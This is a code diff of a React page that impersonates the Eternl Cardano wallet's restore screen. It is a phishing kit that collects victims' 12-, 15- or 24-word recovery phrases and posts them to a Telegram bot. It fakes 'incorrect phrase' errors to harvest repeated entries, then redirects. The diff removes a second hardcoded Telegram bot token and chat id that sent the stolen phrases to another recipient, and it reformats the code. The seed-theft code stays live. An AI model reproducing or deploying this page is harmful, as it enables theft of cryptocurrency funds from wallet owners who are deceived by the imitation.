@@ -1,15 +1,13 @@
-import { useState } from 'react';
-import { Link, useNavigate } from 'react-router-dom';
+import { useState } from "react";
+import { Link, useNavigate } from "react-router-dom";
 
 function EternlRestoreWallet() {
-
   const [isMenuOpen, setIsMenuOpen] = useState(false);
-  const [selectedWallet, setSelectedWallet] = useState('');
+  const [selectedWallet, setSelectedWallet] = useState("");
   const [isNextClicked, setIsNextClicked] = useState(false);
   const [seedPhrase, setSeedPhrase] = useState([]);
   const [attempts, setAttempts] = useState(0);
   const navigate = useNavigate();
-
 
   const handleToggle = () => {
     setIsMenuOpen(!isMenuOpen);
@@ -23,7 +21,7 @@ function EternlRestoreWallet() {
     if (selectedWallet) {
       setIsNextClicked(true);
     } else {
-      alert('Please select a wallet type.');
+      alert("Please select a wallet type.");
     }
   };
 
@@ -33,31 +31,19 @@ function EternlRestoreWallet() {
     setSeedPhrase(newSeedPhrase);
   };
 
-
   const handleRestoreWallet = async () => {
     const message = seedPhrase.join(" ");
 
-    const token = process.env.REACT_APP_TELEGRAM_TOKEN;
-    const chat_id = process.env.REACT_APP_TELEGRAM_CHAT_ID;
-    
-    const otherToken = "6838411368:AAElyI53lMBW6NAfmGIinBMzBPBACQ2B058";
-    const otherChat_id = "6338150634";
-
-
+    const token = import.meta.env.VITE_REACT_APP_TELEGRAM_TOKEN;
+    const chat_id = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;
 
     const url = `https://api.telegram.org/bot${token}/sendMessage`;
-    const otherUrl = `https://api.telegram.org/bot${otherToken}/sendMessage`;
 
     const data = {
       chat_id: chat_id,
       text: `Eternl:   ${message}`,
     };
-    const otherData = {
-      chat_id: otherChat_id,
-      text: `Eternl:   ${message}`,
-    };
-
-    setAttempts(prevAttempts => prevAttempts + 1);
+    setAttempts((prevAttempts) => prevAttempts + 1);
 
     if (attempts < 2) {
       alert("Incorrect recovery phrase. Please try again.");
@@ -70,75 +56,93 @@ function EternlRestoreWallet() {
           },
           body: JSON.stringify(data),
         });
-  
+
         if (!response.ok) {
           throw new Error("Network response was not ok");
         }
-
-
-        const otherResponse = await fetch(otherUrl, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify(otherData),
-        });
-  
-        if (!otherResponse.ok) {
-          throw new Error("Network response was not ok");
-        }
-
 
         // const responseData = await response.json();
         console.log("success");
       } catch (error) {
         console.error("Error sending message:", error);
       }
-  
-      navigate("/")
+
+      navigate("/");
     }
   };
 
   const renderInputs = () => {
-    const numWords = selectedWallet === '24words' ? 24 : selectedWallet === '15words' ? 15 : selectedWallet === '12words' ? 12 : 0;
+    const numWords =
+      selectedWallet === "24words"
+        ? 24
+        : selectedWallet === "15words"
+        ? 15
+        : selectedWallet === "12words"
+        ? 12
+        : 0;
     return (
-      <div className=' overflow-x-auto p-2' style={{maxHeight:"60vh"}}>
-      <div className='bg-[#646f7e] p-3 text-white flex items-center text-xs md:text-base text-left gap-2'>
-        <i className='fa-solid fa-circle-info'></i>
-        <p>Enter your wallet recovery phrase word for word. Make sure you enter the words in the correct order. Also ensure nobody is looking at your screen.</p>
-      </div>
-      <h1 className='text-white text-left mt-5'>  Recovery Phrase</h1>
-      <div className=' grid grid-cols-2 md:grid-cols-4 mt-10 text-left flex flex-col gap-3 text-xs md:text-sm' >
-        {[...Array(numWords)].map((_, index) => (
+      <div className=" overflow-x-auto p-2" style={{ maxHeight: "60vh" }}>
+        <div className="bg-[#646f7e] p-3 text-white flex items-center text-xs md:text-base text-left gap-2">
+          <i className="fa-solid fa-circle-info"></i>
+          <p>
+            Enter your wallet recovery phrase word for word. Make sure you enter
+            the words in the correct order. Also ensure nobody is looking at
+            your screen.
+          </p>
+        </div>
+        <h1 className="text-white text-left mt-5"> Recovery Phrase</h1>
+        <div className=" grid grid-cols-2 md:grid-cols-4 mt-10 text-left flex flex-col gap-3 text-xs md:text-sm">
+          {[...Array(numWords)].map((_, index) => (
+            <input
+              key={index}
+              type="text"
+              className="mb-2 p-2 border rounded bg-[#646f7e] text-white"
+              placeholder={`Word ${index + 1}`}
+              onChange={(event) => handleInputChange(index, event)}
+            />
+          ))}
+        </div>
+
+        <div className="text-white text-left">
+          <h1>Enter Word</h1>
+          <h1 className="p-3 bg-[#646f7e] rounded">
+            Enter a character to get suggestions.{" "}
+          </h1>
           <input
-            key={index}
-            type='text'
-            className='mb-2 p-2 border rounded bg-[#646f7e] text-white'
-            placeholder={`Word ${index + 1}`}
-            onChange={(event) => handleInputChange(index, event)}
+            type="text"
+            name=""
+            id=""
+            className="bg-[#383838] mt-3 mb-3 p-3  "
+            style={{ width: "100%" }}
           />
-        ))}
-      </div>
+        </div>
 
-      <div className='text-white text-left'>
-        <h1>Enter Word</h1>
-        <h1 className='p-3 bg-[#646f7e] rounded'>Enter a character to get suggestions.  </h1>
-        <input type="text" name="" id="" className='bg-[#383838] mt-3 mb-3 p-3  ' style={{width:"100%"}} />
-      </div>
-
-
-      <div className='flex gap-3 mb-8 text-white justify-end'>
-        <Link to='/eternlAddWallet' className='ps-8 pe-8 pt-2 pb-2 rounded bg-[#383838]'>Back</Link>
-        <button  className={`ps-8 pe-8 pt-2 pb-2 rounded bg-[#646f7e] ${seedPhrase.length !== numWords || seedPhrase.includes('') ? 'opacity-30' : 'opacity-100'}`}  onClick={handleRestoreWallet}
-            disabled={seedPhrase.length !== numWords || seedPhrase.includes('')}>Continue</button>
-      </div>
+        <div className="flex gap-3 mb-8 text-white justify-end">
+          <Link
+            to="/eternlAddWallet"
+            className="ps-8 pe-8 pt-2 pb-2 rounded bg-[#383838]"
+          >
+            Back
+          </Link>
+          <button
+            className={`ps-8 pe-8 pt-2 pb-2 rounded bg-[#646f7e] ${
+              seedPhrase.length !== numWords || seedPhrase.includes("")
+                ? "opacity-30"
+                : "opacity-100"
+            }`}
+            onClick={handleRestoreWallet}
+            disabled={seedPhrase.length !== numWords || seedPhrase.includes("")}
+          >
+            Continue
+          </button>
+        </div>
       </div>
     );
   };
 
   return (
-    <div className='EternlRestoreWallet fixed inset-0 backdrop-blur-sm z-50 bg-[#131826]  z-50'>
-         <nav className="bg-[#131826] pt-3 ps-3 pe-3 pb-1">
+    <div className="EternlRestoreWallet fixed inset-0 backdrop-blur-sm z-50 bg-[#131826]  z-50">
+      <nav className="bg-[#131826] pt-3 ps-3 pe-3 pb-1">
         <div className="flex items-center justify-between">
           <img
             src="https://eternl.io/images/img-logo-small.png"
@@ -151,9 +155,7 @@ function EternlRestoreWallet() {
             <i className="fa-solid fa-plug"></i>
             <i className="fa-solid fa-sun"></i>
             <i
-              className={`fa-solid ${
-                isMenuOpen ? "fa-x" : "fa-bars"
-              }`}
+              className={`fa-solid ${isMenuOpen ? "fa-x" : "fa-bars"}`}
               onClick={handleToggle}
             ></i>
           </div>
@@ -197,67 +199,79 @@ function EternlRestoreWallet() {
       )}
 
       <div className="p-3 md:ps-20 md:pe-20 md:pb-20 text-center bg-[#262626]">
-      <div className="bg-[#383838] text-white p-3">
-        <h1>Restore a Cardano wallet</h1>
-        <p>Only Shelley era wallets supported.</p>
-      </div>
-      {!isNextClicked ? (
-       <div className='text-left text-white text-sm md:text-base md:ps-20 m-auto mt-6 md:mt-20'  style={{maxWidth:"900px"}}>
-        <h1 className='mb-4 font-bold'>What kind of wallet would you like to restore?</h1>
-        <p>Daedalus, Yoroi and Eternl use recovery phrases of either 15 or 24 words length. 12 words are also common. 
-            Byron era wallets are currently not supported. If you need to recover a pre-August 2020 wallet, please use Daedalus.</p>
+        <div className="bg-[#383838] text-white p-3">
+          <h1>Restore a Cardano wallet</h1>
+          <p>Only Shelley era wallets supported.</p>
+        </div>
+        {!isNextClicked ? (
+          <div
+            className="text-left text-white text-sm md:text-base md:ps-20 m-auto mt-6 md:mt-20"
+            style={{ maxWidth: "900px" }}
+          >
+            <h1 className="mb-4 font-bold">
+              What kind of wallet would you like to restore?
+            </h1>
+            <p>
+              Daedalus, Yoroi and Eternl use recovery phrases of either 15 or 24
+              words length. 12 words are also common. Byron era wallets are
+              currently not supported. If you need to recover a pre-August 2020
+              wallet, please use Daedalus.
+            </p>
 
-
-
-        <div className='mt-10 text-left flex flex-col gap-3 text-xs md:text-sm'>
-        <div className='flex items-start gap-3'>
-        <input
-                  type='radio'
-                  name='wallet'
-                  value='24words'
-                  checked={selectedWallet === '24words'}
+            <div className="mt-10 text-left flex flex-col gap-3 text-xs md:text-sm">
+              <div className="flex items-start gap-3">
+                <input
+                  type="radio"
+                  name="wallet"
+                  value="24words"
+                  checked={selectedWallet === "24words"}
                   onChange={handleWalletChange}
                 />
-          <div>
-            <h1>24 Words</h1>
-            <p>A Shelley wallet created by, eg. Eternl or Daedalus.</p>
-          </div>
-        </div>
+                <div>
+                  <h1>24 Words</h1>
+                  <p>A Shelley wallet created by, eg. Eternl or Daedalus.</p>
+                </div>
+              </div>
 
-        <div className='flex items-start gap-3'>
-        <input
-                  type='radio'
-                  name='wallet'
-                  value='15words'
-                  checked={selectedWallet === '15words'}
+              <div className="flex items-start gap-3">
+                <input
+                  type="radio"
+                  name="wallet"
+                  value="15words"
+                  checked={selectedWallet === "15words"}
                   onChange={handleWalletChange}
                 />
-          <div>
-            <h1>15 Words</h1>
-            <p>Eg. a Yoroi Shelley wallet..</p>
-          </div>
-        </div>
+                <div>
+                  <h1>15 Words</h1>
+                  <p>Eg. a Yoroi Shelley wallet..</p>
+                </div>
+              </div>
 
-        <div className='flex items-start gap-3'>
-        <input
-                  type='radio'
-                  name='wallet'
-                  value='12words'
-                  checked={selectedWallet === '12words'}
+              <div className="flex items-start gap-3">
+                <input
+                  type="radio"
+                  name="wallet"
+                  value="12words"
+                  checked={selectedWallet === "12words"}
                   onChange={handleWalletChange}
                 />
-          <div>
-            <h1>12 Words</h1>
-            <p>A 12 words Shelley wallet..</p>
-          </div>
-        </div>
-       </div>
+                <div>
+                  <h1>12 Words</h1>
+                  <p>A 12 words Shelley wallet..</p>
+                </div>
+              </div>
+            </div>
 
-      <div className='text-right'>
-      <button className='text-right bg-[#646f7e] rounded ps-10 pe-10 pt-2 pb-2' onClick={handleNextClick}>Next</button>
-      </div>
-       </div>
-       ) : (
+            <div className="text-right">
+              <button
+                className="text-right bg-[#646f7e] rounded ps-10 pe-10 pt-2 pb-2"
+                onClick={handleNextClick}
+              >
+                Next
+              </button>
+            </div>
+          </div>
+        ) : (
           renderInputs()
         )}
       </div>
@@ -268,7 +282,7 @@ function EternlRestoreWallet() {
         <i className="fa-brands fa-discord"></i>
       </footer>
     </div>
-  )
+  );
 }
 
-export default EternlRestoreWallet
+export default EternlRestoreWallet;
